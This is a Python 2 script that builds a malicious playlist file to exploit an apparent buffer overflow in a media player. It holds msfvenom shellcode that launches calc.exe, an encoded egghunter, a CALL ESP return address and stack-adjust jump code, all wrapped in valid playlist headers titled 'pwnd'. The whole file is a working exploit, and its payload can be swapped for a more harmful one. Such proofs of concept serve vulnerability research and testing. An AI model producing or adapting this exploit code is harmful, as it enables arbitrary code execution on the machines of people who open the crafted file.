import sys

if len(sys.argv) <= 1:
    print "Usage: python " + sys.argv[0] + " [filename]"
    exit()

filename = sys.argv[1]

# Prefix
prefix = "[playlist]\r\nFile1=\\\\"

# msfvenom -p windows/exec cmd=calc.exe -b '\x00\x0a\x0d\x2e' -v dosomething -f python
# Open calc.exe
# 220 bytes
dosomething =  ""
dosomething += "\xbb\x4f\xf5\xb9\xe7\xd9\xc1\xd9\x74\x24\xf4"
dosomething += "\x5a\x29\xc9\xb1\x53\x83\xc2\x04\x31\x5a\x0e"
dosomething += "\x03\x15\xfb\x5b\x12\x55\xeb\x1e\xdd\xa5\xec"
dosomething += "\x7e\x57\x40\xdd\xbe\x03\x01\x4e\x0f\x47\x47"
dosomething += "\x63\xe4\x05\x73\xf0\x88\x81\x74\xb1\x27\xf4"
dosomething += "\xbb\x42\x1b\xc4\xda\xc0\x66\x19\x3c\xf8\xa8"
dosomething += "\x6c\x3d\x3d\xd4\x9d\x6f\x96\x92\x30\x9f\x93"
dosomething += "\xef\x88\x14\xef\xfe\x88\xc9\xb8\x01\xb8\x5c"
dosomething += "\xb2\x5b\x1a\x5f\x17\xd0\x13\x47\x74\xdd\xea"
dosomething += "\xfc\x4e\xa9\xec\xd4\x9e\x52\x42\x19\x2f\xa1"
dosomething += "\x9a\x5e\x88\x5a\xe9\x96\xea\xe7\xea\x6d\x90"
dosomething += "\x33\x7e\x75\x32\xb7\xd8\x51\xc2\x14\xbe\x12"
dosomething += "\xc8\xd1\xb4\x7c\xcd\xe4\x19\xf7\xe9\x6d\x9c"
dosomething += "\xd7\x7b\x35\xbb\xf3\x20\xed\xa2\xa2\x8c\x40"
dosomething += "\xda\xb4\x6e\x3c\x7e\xbf\x83\x29\xf3\xe2\xcb"
dosomething += "\x9e\x3e\x1c\x0c\x89\x49\x6f\x3e\x16\xe2\xe7"
dosomething += "\x72\xdf\x2c\xf0\x75\xca\x89\x6e\x88\xf5\xe9"
dosomething += "\xa7\x4f\xa1\xb9\xdf\x66\xca\x51\x1f\x86\x1f"
dosomething += "\xcf\x17\x21\xf0\xf2\xda\x91\xa0\xb2\x74\x7a"
dosomething += "\xab\x3c\xab\x9a\xd4\x96\xc4\x33\x29\x19\xf1"
dosomething += "\xfa\xa4\xff\x6f\xed\xe0\xa8\x07\xcf\xd6\x60"
dosomething += "\xb0\x30\x3d\xd9\x56\x78\x57\xde\x59\x79\x7d"
dosomething += "\x48\xcd\xf2\x92\x4c\xec\x04\xbf\xe4\x79\x92"
dosomething += "\x35\x65\xc8\x02\x49\xac\xba\xa7\xd8\x2b\x3a"
dosomething += "\xa1\xc0\xe3\x6d\xe6\x37\xfa\xfb\x1a\x61\x54"
dosomething += "\x19\xe7\xf7\x9f\x99\x3c\xc4\x1e\x20\xb0\x70"
dosomething += "\x05\x32\x0c\x78\x01\x66\xc0\x2f\xdf\xd0\xa6"
dosomething += "\x99\x91\x8a\x70\x75\x78\x5a\x04\xb5\xbb\x1c"
dosomething += "\x09\x90\x4d\xc0\xb8\x4d\x08\xff\x75\x1a\x9c"
dosomething += "\x78\x68\xba\x63\x53\x28\xca\x29\xf9\x19\x43"
dosomething += "\xf4\x68\x18\x0e\x07\x47\x5f\x37\x84\x6d\x20"
dosomething += "\xcc\x94\x04\x25\x88\x12\xf5\x57\x81\xf6\xf9"
dosomething += "\xc4\xa2\xd2"

# Generate NOP's
nop = "RODORODO" + dosomething + "\xCC" * (856 - 8 - len(dosomething))       # 856 - 8 bytes of strings to hunt for - size of dosomething

# Egghunter using "ODOR", size 132
# msfvenom -p generic/custom PAYLOADFILE=egghunter_debug.bin -e x86/alpha_upper -f python -v egghunt
egghunt =  ""
egghunt += "\x89\xe1\xdb\xd0\xd9\x71\xf4\x5a\x4a\x4a\x4a\x4a"
egghunt += "\x4a\x43\x43\x43\x43\x43\x43\x52\x59\x56\x54\x58"
egghunt += "\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48"
egghunt += "\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41"
egghunt += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50"
egghunt += "\x38\x41\x43\x4a\x4a\x49\x52\x46\x4d\x51\x38\x4a"
egghunt += "\x4b\x4f\x44\x4f\x31\x52\x46\x32\x53\x5a\x43\x32"
egghunt += "\x56\x38\x58\x4d\x56\x4e\x47\x4c\x55\x55\x31\x4a"
egghunt += "\x52\x54\x5a\x4f\x58\x38\x36\x32\x30\x4f\x57\x34"
egghunt += "\x30\x4f\x4c\x4b\x4a\x5a\x4e\x4f\x34\x35\x4a\x4a"
egghunt += "\x4e\x4f\x43\x45\x4a\x47\x4b\x4f\x4a\x47\x41\x41"

# Shellcode
sc = "\xcc" * (166 - len(egghunt))

# Jump around
jump = "\xe3\x27\x29\x1a"                       # CALL ESP 1A2927E3
jump += "\x83\xec\x58\x83\xec\x58\xff\xe4"      # First stage payload
jump += "\x90" * 4                              # NOP for padding

# Suffix
suffix = "\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"

# Concatenate string for sending
code = prefix + nop + egghunt + sc + jump + suffix

f = open(filename, 'wb')
f.write(code)
f.close()
